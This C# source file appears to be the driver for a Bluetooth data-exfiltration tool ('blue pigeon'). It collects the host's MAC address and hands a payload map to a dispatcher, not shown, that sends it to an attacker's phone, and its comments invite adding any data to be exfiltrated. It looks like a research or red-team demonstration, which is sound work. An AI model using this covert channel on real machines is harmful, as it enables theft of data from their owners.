using System;
using System.Collections.Generic;
using System.Net.NetworkInformation;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlueDispatcher
{
    class Program
    {
        static void Main(string[] args)
        {
            // change the device name to your blue pigeon's bluetooth device name
            string deviceName = "Xiaomi HM Note3";

            // any info that you want your pigeon to exfiltrate can be added to the payload map e.g. mac addres
            var payload = new Dictionary<string, string>();
            string msg = "fly pigeon fly";
            payload.Add("message", msg);
            string macAddr = GetMacAddress();
            payload.Add("mac_address", macAddr);

            // bluedispatcher helps you send the payload to your blue pigeon
            BlueDispatcher blueDispatcher = new BlueDispatcher();
            blueDispatcher.Send(deviceName, payload);
            Console.ReadLine();
        }

        /// <summary>
        /// gets the device mac address
        /// </summary>
        /// <returns>mac address</returns>
        private static string GetMacAddress()
        {
            const int MIN_MAC_ADDR_LENGTH = 12;
            string macAddress = string.Empty;
            long maxSpeed = -1;

            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {

                string tempMac = nic.GetPhysicalAddress().ToString();
                if (nic.Speed > maxSpeed &&
                    !string.IsNullOrEmpty(tempMac) &&
                    tempMac.Length >= MIN_MAC_ADDR_LENGTH)
                {
                    maxSpeed = nic.Speed;
                    macAddress = tempMac;
                }
            }

            return macAddress;
        }
    }
}
